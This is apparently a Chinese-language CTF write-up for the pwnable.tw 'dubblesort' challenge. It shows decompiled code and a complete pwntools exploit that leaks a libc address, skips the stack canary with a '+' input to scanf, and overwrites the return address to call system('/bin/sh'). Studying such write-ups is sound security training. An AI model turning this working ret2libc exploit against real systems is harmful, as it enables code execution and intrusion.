---
title: pwnable tw dubblesort writeup
date: 2021-11-13 15:44:54
tags: pwnable | bof | ret2libc
---
<!--more-->

##题目考点
 - ret2libc
 - 绕过canary

--------

##解题思路

 check一下，保护全开，不过是32位程序(可以把参数/bin/sh直接放在栈上传入system()函数执行，若是64位程序难度更大)

 进入ida进行分析，主要逻辑在main函数中，比较简单:

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v3; // eax
  int *v4; // edi
  unsigned int v5; // esi
  unsigned int v6; // esi
  int v7; // ST08_4
  int result; // eax
  unsigned int v9; // [esp+18h] [ebp-74h]
  int v10; // [esp+1Ch] [ebp-70h]
  char buf; // [esp+3Ch] [ebp-50h]
  unsigned int v12; // [esp+7Ch] [ebp-10h]		//canary位置特殊，其下距离retaddr还有(0x10 - 0x04 + 0x0c + 0x08)bytes的空间，即8个int的位置

  v12 = __readgsdword(0x14u);
  sub_8B5();
  __printf_chk(1, "What your name :");		//单纯从做题角度来看，这种意义不明的输入必是突破口了
  read(0, &buf, 0x40u);						//仔细观察调试后发现，栈上有残留数据
  __printf_chk(1, "Hello %s,How many numbers do you what to sort :");
  //利用printf'\0'截断的特性来输出栈上残留数据，此处为.got.plt的地址，进而泄露libc基址
  __isoc99_scanf("%u", &v9);
  v3 = v9;
  if ( v9 )
  {
    v4 = &v10;
    v5 = 0;
    do
    {
      __printf_chk(1, "Enter the %d number : ");
//通过此处改变栈上数据，篡改retaddr为system函数地址，retaddr之后的位置存放"/bin/sh"字符串地址
      fflush(stdout);
      __isoc99_scanf("%u", v4);
      ++v5;
      v3 = v9;
      ++v4;
    }
    while ( v9 > v5 );
  }
  sub_931((unsigned int *)&v10, v3);
/*
由于该排序函数以及canary的存在，需要保证:{
   - canary前的数据都比canary小
   - canary后的值都比其大
}
*/
  puts("Result :");
  if ( v9 )
  {
    v6 = 0;
    do
    {
      v7 = *(&v10 + v6);
      __printf_chk(1, "%u ");
      ++v6;
    }
    while ( v9 > v6 );
  }
  result = 0;
  if ( __readgsdword(0x14u) != v12 )
    sub_BA0();
  return result;
}
```

 在开始编写exp之前，由于题目提供了libc，还需要调整本地环境:
```sh
ldd ./dubblesort
patchelf --set-interpreter /root/asswecan/glibc-all-in-one/libs/2.23-0ubuntu3_i386/ld-linux.so.2 dubblesort
patchelf --replace-needed libc.so.6 ./libc_32.so.6 dubblesort
```

--------

##exploit

```py
from pwn import *

p 	 = process('./dubblesort')
libc = ELF('./libc_32.so.6')
#"readelf -S ./libc_32.so.6"得到的偏移量
offs = 0x001b0000

p.recvuntil(b'What your name :')
#0x18+1来连接到地址(地址末位为00)
p.send(b'a' * (0x18 + 1))
p.recvuntil(b'a' * 0x18)
#注意此处的运算符优先级/哭哭调了好久才意识到这个小错误
libc_base = (u32(p.recv(4)) & 0xffffff00) - offs
syst_addr = libc_base + libc.symbols['system']
bins_addr = libc_base + next(libc.search(b'/bin/sh'))
p.recv()

stack_off = (0x60 // 4) + 1 + 9 + 1
p.sendline(str(stack_off).encode())
for i in range(0x60 // 4):
	p.recvuntil(b'number :')
	p.sendline(b'0')
#'+'可以让scanf%u视作合法输入却不改变栈上的值
p.recvuntil(b'number :')
p.sendline(b'+')
#为了sysaddr不被排序函数改变，直接在栈上填9个sysaddr至retaddr处
for i in range(0x09):
	p.recvuntil(b'number :')
	p.sendline(str(syst_addr).encode())
p.recvuntil(b'number :')
p.sendline(str(bins_addr).encode())

p.recvuntil(b'Result :')
p.recv()
p.interactive()
```